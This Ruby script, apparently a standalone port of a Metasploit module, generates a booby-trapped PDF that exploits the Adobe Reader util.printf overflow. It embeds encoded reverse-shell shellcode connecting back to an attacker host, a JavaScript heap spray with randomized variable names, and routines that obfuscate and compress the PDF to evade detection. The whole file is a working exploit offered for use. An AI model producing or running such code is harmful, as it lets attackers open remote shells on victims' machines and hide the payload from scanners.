#Original code: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/browser/adobe_utilprintf.rb
#Standalone Ported by Carl Zhou
#Generates pdf payload used for attack

require 'zlib'

def exploit
    #msfvenom -p windows/shell_reverse_tcp EXTIFUNC=seh LHOST=[ATTACKER IP] LPORT=[ATTACKER PORT] -e "x86/alpha_mixed" -f js_le
    #size: 710 bytes
    shellcode = "%ue089%ud0da%u70d9%u5bf4%u5953%u4949%u4949%u4949%u4949%u4949%u4343%u4343%u4343%u5137%u6a5a%u5841%u3050%u3041%u6b41%u4141%u3251%u4241%u4232%u3042%u4242%u4241%u5058%u4138%u7542%u494a%u6c59%u7859%u624e%u3053%u3063%u7047%u3075%u696e%u7569%u3170%u304f%u5443%u4b4c%u5030%u5066%u4b6c%u3266%u6c76%u4b6c%u7232%u7436%u4b4c%u7250%u3871%u4f34%u476f%u4a30%u6674%u5176%u4f4b%u4c4e%u4c67%u5143%u4c53%u5235%u4c56%u5057%u5169%u6f6a%u6d76%u3133%u676a%u7259%u6259%u3256%u3766%u4b6c%u6263%u3072%u4b4c%u5a31%u4c37%u4b6c%u6c32%u5164%u6851%u6368%u4870%u6176%u5148%u3176%u6b4e%u3966%u5057%u5135%u5368%u6b4e%u4970%u6867%u6338%u5a66%u6952%u6b6e%u4477%u4b4c%u6166%u5658%u3150%u4f4b%u4c6e%u615a%u4f68%u4d64%u7177%u675a%u6865%u306d%u6561%u7648%u3343%u6d71%u486b%u4b67%u4d53%u7455%u3564%u6478%u3856%u6b4e%u4871%u7465%u6146%u636b%u6650%u6b4e%u6c76%u6b32%u4b6c%u6843%u6c57%u5175%u5358%u4b4c%u4454%u6b6e%u3173%u706a%u396b%u3467%u6464%u6464%u4b71%u6b73%u3145%u6973%u7a32%u7132%u6f59%u506b%u6f43%u4f51%u7a52%u4b4c%u5244%u6b58%u6d4e%u4d51%u3875%u6355%u4237%u7067%u5035%u5833%u4763%u6331%u4237%u6f53%u4431%u3875%u4c30%u7770%u7675%u5735%u6f69%u4579%u3878%u506c%u6156%u5045%u3033%u3971%u5479%u6473%u5070%u4872%u5957%u704f%u4b62%u7077%u6f49%u354e%u3056%u7042%u3056%u7032%u3057%u3076%u7033%u3066%u4832%u6a38%u6f36%u6f4b%u304d%u6f79%u5558%u476d%u5a63%u4564%u5833%u5a75%u4b64%u3073%u7755%u6850%u4244%u5075%u6167%u6c43%u396b%u7659%u5a33%u7046%u3646%u4771%u3855%u496d%u3549%u4463%u6150%u6f59%u756a%u354b%u5079%u6461%u6c46%u4f4b%u6e32%u5855%u5572%u6c48%u4852%u7038%u3578%u524f%u6663%u4f4b%u4579%u3855%u3355%u6d30%u5443%u5075%u496c%u435a%u3776%u7772%u3766%u6135%u364c%u4a42%u5254%u6933%u7632%u6268%u4d4b%u7651%u4738%u7453%u3461%u6c55%u3163%u3173%u6d6e%u4470%u7445%u3062%u5649%u3073%u6442%u7462%u3036%u4631%u7632%u4661%u7663%u7672%u4e30%u6633%u7672%u7332%u3646%u7861%u5942%u6c7a%u4f67%u564d%u6f59%u656b%u696e%u306d%u6e62%u3656%u4650%u4f4b%u5066%u7861%u7837%u776f%u4d65%u3075%u6f69%u654b%u6b4d%u304c%u556e%u3239%u7672%u4842%u764d%u656f%u4d6f%u6d4f%u4f6b%u4579%u4c47%u6646%u4c53%u6a66%u304b%u4b4b%u7069%u6531%u5565%u4b6f%u6732%u5354%u6271%u4f62%u4a72%u7077%u6363%u6f69%u4549%u4141"
    pdfname = "evil.pdf"

    # Make some nops
    nops    = to_unescape("\x90" * 4)

    # Randomize variables
    rand1  = rand_text_alpha(rand(100) + 1)
    rand2  = rand_text_alpha(rand(100) + 1)
    rand3  = rand_text_alpha(rand(100) + 1)
    rand4  = rand_text_alpha(rand(100) + 1)
    rand5  = rand_text_alpha(rand(100) + 1)
    rand6  = rand_text_alpha(rand(100) + 1)
    rand7  = rand_text_alpha(rand(100) + 1)
    rand8  = rand_text_alpha(rand(100) + 1)
    rand9  = rand_text_alpha(rand(100) + 1)
    rand10 = rand_text_alpha(rand(100) + 1)
    rand11 = rand_text_alpha(rand(100) + 1)

    script = %Q|
    var #{rand1} = unescape("#{shellcode}");
    var #{rand2} ="";
    for (#{rand3}=128;#{rand3}>=0;--#{rand3}) #{rand2} += unescape("#{nops}");
    #{rand4} = #{rand2} + #{rand1};
    #{rand5} = unescape("#{nops}");
    #{rand6} = 20;
    #{rand7} = #{rand6}+#{rand4}.length
    while (#{rand5}.length<#{rand7}) #{rand5}+=#{rand5};
    #{rand8} = #{rand5}.substring(0, #{rand7});
    #{rand9} = #{rand5}.substring(0, #{rand5}.length-#{rand7});
    while(#{rand9}.length+#{rand7} < 0x40000) #{rand9} = #{rand9}+#{rand9}+#{rand8};
    #{rand10} = new Array();
    for (#{rand11}=0;#{rand11}<1450;#{rand11}++) #{rand10}[#{rand11}] = #{rand9} + #{rand4};
    util.printf("%45000.45000f", 0);
	|

    # Create the pdf
    pdf = make_pdf(script)

    print "Creating '#{pdfname}' file..."

    File.write(pdfname, pdf)

    #send_response(cli, pdf, { 'Content-Type' => 'application/pdf' }) leave commented
    #handler(cli) leave commented
end

def self.rand_text_alpha(len, bad='')
  foo = []
  foo += ('A' .. 'Z').to_a
  foo += ('a' .. 'z').to_a
  rand_base(len, bad, *foo )
end

def rand_base(len, bad, *foo)
  cset = (foo.join.unpack("C*") - bad.to_s.unpack("C*")).uniq
  return "" if cset.length == 0
  outp = []
  len.times { outp << cset[rand(cset.length)] }
  outp.pack("C*")
end

def self.to_unescape(data, endian="endian_little", prefix='%%u')
    data << "\x41" if (data.length % 2 != 0)
    dptr = 0
    buff = ''
    while (dptr < data.length)
      c1 = data[dptr,1].unpack("C*")[0]
      dptr += 1
      c2 = data[dptr,1].unpack("C*")[0]
      dptr += 1

      if (endian == "endian_little")
        buff << sprintf("#{prefix}%.2x%.2x", c2, c1)
      else
        buff << sprintf("#{prefix}%.2x%.2x", c1, c2)
      end
    end
    return buff
end

def random_non_ascii_string(count)
  result = ""
  count.times do
    result << (rand(128) + 128).chr
  end
  result
end

 
def io_def(id)
  "%d 0 obj" % id
end

def io_ref(id)
   "%d 0 R" % id
end

#http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/
def n_obfu(str)
  result = ""
  str.scan(/./u) do |c|
    if rand(2) == 0 and c.upcase >= 'A' and c.upcase <= 'Z'
      result << "#%x" % c.unpack("C*")[0]
    else
      result << c
    end
  end
  result
end

def ascii_hex_whitespace_encode(str)
  result = ""
  whitespace = ""
  str.each_byte do |b|
    result << whitespace << "%02x" % b
    whitespace = " " * (rand(3) + 1)
  end
  result << ">"
end

def make_pdf(js)

    xref = []
    eol = "\x0d\x0a"
    endobj = "endobj" << eol

    # Randomize PDF version?
    pdf = "%PDF-1.5" << eol
    pdf << "%" << random_non_ascii_string(4) << eol
    xref << pdf.length
    pdf << io_def(1) << n_obfu("<</Type/Catalog/Outlines ") << io_ref(2) << n_obfu("/Pages ") << io_ref(3) << n_obfu("/OpenAction ") << io_ref(5) << ">>" << endobj
    xref << pdf.length
    pdf << io_def(2) << n_obfu("<</Type/Outlines/Count 0>>") << endobj
    xref << pdf.length
    pdf << io_def(3) << n_obfu("<</Type/Pages/Kids[") << io_ref(4) << n_obfu("]/Count 1>>") << endobj
    xref << pdf.length
    pdf << io_def(4) << n_obfu("<</Type/Page/Parent ") << io_ref(3) << n_obfu("/MediaBox[0 0 612 792]>>") << endobj
    xref << pdf.length
    pdf << io_def(5) << n_obfu("<</Type/Action/S/JavaScript/JS ") + io_ref(6) + ">>" << endobj
    xref << pdf.length
    compressed = Zlib::Deflate.deflate(ascii_hex_whitespace_encode(js))
    pdf << io_def(6) << n_obfu("<</Length %s/Filter[/FlateDecode/ASCIIHexDecode]>>" % compressed.length) << eol
    pdf << "stream" << eol
    pdf << compressed << eol
    pdf << "endstream" << eol
    pdf << endobj
    xrefPosition = pdf.length
    pdf << "xref" << eol
    pdf << "0 %d" % (xref.length + 1) << eol
    pdf << "0000000000 65535 f" << eol
    xref.each do |index|
      pdf << "%010d 00000 n" % index << eol
    end
    pdf << "trailer" << n_obfu("<</Size %d/Root " % (xref.length + 1)) << io_ref(1) << ">>" << eol
    pdf << "startxref" << eol
    pdf << xrefPosition.to_s() << eol
    pdf << "%%EOF" << eol

end

exploit
